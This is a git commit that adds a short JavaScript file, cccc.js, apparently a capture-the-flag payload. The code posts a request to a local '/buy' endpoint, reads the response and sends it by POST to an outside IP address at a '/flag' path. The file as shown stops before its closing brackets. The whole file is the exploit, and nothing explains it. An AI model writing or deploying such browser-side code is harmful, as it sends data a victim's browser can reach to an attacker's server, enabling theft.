404dc7a40f60a8ef06436441263eea11f6a640c4
sh4ll0t <144364845+sh4ll0t@users.noreply.github.com>
2024-03-27 00:56:02 +0800

    Create cccc.js

---
+++ cccc.js
@@ -0,0 +1,12 @@
+const fdata = new URLSearchParams();
+fdata.append('id', '0');
+fetch("http://localhost/buy", {
+method: "POST",
+body: fdata
+}).then((res) => {
+return res.text();
+}).then((data) => {
+fetch("http://120.26.219.126:5000/flag", {
+method: "POST",
+body: data
+}
